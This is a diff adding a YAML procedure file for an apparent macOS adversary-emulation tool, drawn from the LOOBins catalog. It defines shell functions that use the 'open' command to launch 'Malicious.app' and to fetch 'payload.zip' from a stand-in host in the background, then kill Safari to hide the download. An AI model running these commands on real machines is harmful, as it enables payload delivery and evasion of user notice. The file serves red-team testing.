@@ -1,0 +1,58 @@
+procedure_name: open
+tactic: Execution
+ttp_id: T9999
+guid: $GUID
+intent: Open files, folders, apps, URLs, and header files.
+author: '@darmado | https://x.com/darmad0'
+credit: 'LOOBins catalog author: Brendan Chamberlain (@infosecb)'
+created: '2023-05-10'
+updated: $UPDATED
+version: 1.0.0
+platform:
+- darwin
+detection: []
+resources:
+- link: https://www.loobins.io/
+  description: LOOBins — Living Off The Orchard macOS binaries
+- link: ''
+  description: ''
+- link: https://scriptingosx.com/2017/02/the-macos-open-command/
+  description: The macOS open Command
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --open-a-malicious-file
+    description: The open command can be used to open a malicious macOS app from the terminal.
+    execute_function:
+    - execute_open_malicious_file
+  - option: --download-a-malicious-file
+    description: 'The following command downloads the payload.zip file in the default browser (Safari) and then kills '
+    execute_function:
+    - execute_download_malicious_file
+  global_variable:
+  - name: CMD_OPEN
+    type: string
+    default_value: /usr/bin/open
+  functions:
+  - name: execute_open_malicious_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_open_malicious_file() {\n    local result\n    result=$(open Malicious.app 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\\
+      n\" \"$result\"\n    return 0\n}"
+  - name: execute_download_malicious_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_download_malicious_file() {\n    local result\n    result=$(open -g https://mypayload.io/payload.zip; sleep\
+      \ 3; killall Safari 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
